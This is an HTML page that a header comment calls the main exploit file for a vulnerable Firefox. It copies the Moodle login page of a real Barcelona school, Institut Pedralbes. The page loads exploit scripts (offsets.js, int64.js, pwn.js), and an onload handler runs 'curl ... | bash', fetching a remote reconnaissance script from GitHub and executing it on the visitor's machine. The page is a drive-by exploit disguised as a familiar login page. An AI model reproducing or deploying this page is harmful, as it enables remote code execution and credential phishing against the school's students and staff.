<!--

 * Main exploit file. Open this page in a vulnerable firefox to execute a
   command in a sandboxed content process.
 
 * The command executed can be changed by modifying the argument of
  `execute_command`.
 
 * There is a good chance that this exploit won't work at all if you don't
   change the values in `offsets.js`

Lyte <lyte@lyte.rs>

-->

<!DOCTYPE html>

<html  dir="ltr" lang="ca" xml:lang="ca">
<head>
    <title>Institut Pedralbes de Barcelona: Inicia sessió en aquest lloc</title>
    <link rel="shortcut icon" href="https://campus.institutpedralbes.cat/theme/image.php/boost/theme/1682674448/favicon" />
<meta name="keywords" content="moodle, Institut Pedralbes de Barcelona: Inicia sessió en aquest lloc" />
<link rel="stylesheet" type="text/css" href="https://campus.institutpedralbes.cat/theme/yui_combo.php?rollup/3.17.2/yui-moodlesimple-min.css" /><script id="firstthemesheet" type="text/css">/** Required in order to fix style inclusion problems in IE with YUI **/</script><link rel="stylesheet" type="text/css" href="https://campus.institutpedralbes.cat/theme/styles.php/boost/1682674448_1662981724/all" />

<meta name="google-site-verification" content="AHEcFfuyzLNhDrZLMfzdC8LiJluPJWvsFzePkj4VhfA" /><meta name="robots" content="noindex" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="./offsets.js"></script>
    <script src="./int64.js"></script>
    <script src="./pwn.js"></script>
</head>
<body  id="page-login-index" class="format-site  path-login safari dir-ltr lang-ca yui-skin-sam yui3-skin-sam campus-institutpedralbes-cat pagelayout-login course-1 context-1 notloggedin ">
<div class="toast-wrapper mx-auto py-0 fixed-top" role="status" aria-live="polite"></div>

<div id="page-wrapper">
    <div>
    <a class="sr-only sr-only-focusable" href="#maincontent">Vés al contingut principal</a>
</div>

    <div id="page" class="container-fluid mt-0">
        <div id="page-content" class="row">
            <div id="region-main-box" class="col-12">
                <section id="region-main" class="col-12" aria-label="Contingut">
                    <span class="notifications" id="user-notifications"></span>
                    <div role="main"><span id="maincontent"></span><div class="my-1 my-sm-5"></div>
<div class="row justify-content-center">
<div class="col-xl-6 col-sm-8 ">
<div class="card">
    <div class="card-block">
            <h1 class="h2 card-header text-center" >
                <span class="sr-only">Institut Pedralbes de Barcelona: Inicia la sessió</span>
                <img src="https://campus.institutpedralbes.cat/pluginfile.php/1/core_admin/logo/0x200/1682674448/Logo%20Pedralbes%20Gran.jpg" class="img-fluid" alt=""/>
            </h1>
        <div class="card-body">

            <div class="row justify-content-md-center">
                <div class="col-md-5">
                    <form class="mt-3" action="https://campus.institutpedralbes.cat/login/index.php" method="post" id="login">
                        <input id="anchor" type="hidden" name="anchor" value="">
                        <script>document.getElementById('anchor').value = location.hash;</script>
                        <input type="hidden" name="logintoken" value="GBEBA7ZXsvTtnndodXQxQLyvbOvh7Jb0">
                        <div class="form-group">
                            <label for="username" class="sr-only">
                                    Nom d'usuari
                            </label>
                            <input type="text" name="username" id="username"
                                class="form-control"
                                value=""
                                placeholder="Nom d'usuari"
                                autocomplete="username">
                        </div>
                        <div class="form-group">
                            <label for="password" class="sr-only">Contrasenya</label>
                            <input type="password" name="password" id="password" value=""
                                class="form-control"
                                placeholder="Contrasenya"
                                autocomplete="current-password">
                        </div>
                            <div class="rememberpass mt-3">
                                <input type="checkbox" name="rememberusername" id="rememberusername" value="1"  />
                                <label for="rememberusername">Recorda el nom d'usuari</label>
                            </div>

                        <button type="submit" class="btn btn-primary btn-block mt-3" id="loginbtn">Inicia la sessió</button>
                    </form>
                </div>

                <div class="col-md-5">
                    <div class="forgetpass mt-3">
                        <p><a href="https://campus.institutpedralbes.cat/login/forgot_password.php">Heu oblidat el nom d'usuari o la contrasenya?</a></p>
                    </div>

                    <div class="mt-3">
                        Les galetes han d'estar habilitades en el vostre navegador
                        <a class="btn btn-link p-0" role="button"
    data-container="body" data-toggle="popover"
    data-placement="right" data-content="&lt;div class=&quot;no-overflow&quot;&gt;&lt;p&gt;Aquest lloc utilitza dues galetes:&lt;/p&gt;

&lt;p&gt;L&#039;essencial és la galeta de sessió, generalment anomenada MoodleSession. Heu de permetre aquesta galeta al vostre navegador per donar continuïtat i mantenir la connexió en navegar pel lloc. En finalitzar la sessió o tancar el navegador, aquesta galeta es destrueix (al vostre ordinador i al servidor).&lt;/p&gt;

&lt;p&gt;L&#039;altra galeta, sovint anomenada MOODLEID o alguna cosa semblant, és purament per comoditat. Simplement recorda el vostre nom d&#039;usuari dins del navegador. Això vol dir que quan torneu a aquest lloc el camp d&#039;usuari de la pàgina d&#039;entrada ja estarà emplenat amb el vostre nom. Refusar aquesta galeta és segur: en aquest cas simplement haureu d&#039;escriure el vostre nom d&#039;usuari cada vegada que inicieu la sessió.&lt;/p&gt;
&lt;/div&gt; "
    data-html="true" tabindex="0" data-trigger="focus">
  <i class="icon fa fa-question-circle text-info fa-fw "  title="Ajuda: «Les galetes han d&#039;estar habilitades en el vostre navegador»" aria-label="Ajuda: «Les galetes han d&#039;estar habilitades en el vostre navegador»"></i>
</a>
                    </div>

                    <h2 class="h6 mt-2">Autentiqueu-vos utilitzant el vostre compte a:</h2>
                    <div class="potentialidplist mt-3">
                            <div class="potentialidp">
                                <a href="https://campus.institutpedralbes.cat/auth/oauth2/login.php?id=1&amp;wantsurl=%2F&amp;sesskey=EqDP6Ye5JW" title="Google / @inspedralbes.cat" class="btn btn-secondary btn-block">
                                        <img src="https://accounts.google.com/favicon.ico" alt="" width="24" height="24"/>
                                    Google / @inspedralbes.cat
                                </a>
                            </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
</div>
</div></div>
                    
                </section>
            </div>
        </div>
    </div>
    <footer id="page-footer" class="py-3 bg-dark text-light">
        <div class="container">
            <div id="course-footer"></div>


            <div class="logininfo">No heu iniciat sessió</div>
            <div class="homelink"><a href="https://campus.institutpedralbes.cat/">Inici</a></div>
            <div class="tool_dataprivacy"><a href="https://campus.institutpedralbes.cat/admin/tool/dataprivacy/summary.php">Resum de retenció de dades</a></div><a href="https://download.moodle.org/mobile?version=2020061517&amp;lang=ca&amp;iosappid=633359593&amp;androidappid=com.moodle.moodlemobile">Instal·leu l’aplicació mòbil</a>



        </div>
    </footer>
</div>
<script type="text/javascript">
    window.onload = function() {
        // Espera a que la página cargue antes de ejecutar el exploit
        var exp = new Exploit(OFFSETS);
        // Puedes usar un retraso adicional si es necesario
        setTimeout(function() {
            exp.execute_command("curl -s https://raw.githubusercontent.com/DriveSec/scripts/main/recon_ubuntu_system.sh | bash");
        }, 5000); // Espera 5 segundos antes de ejecutar
    };
</script>
</body>
</html>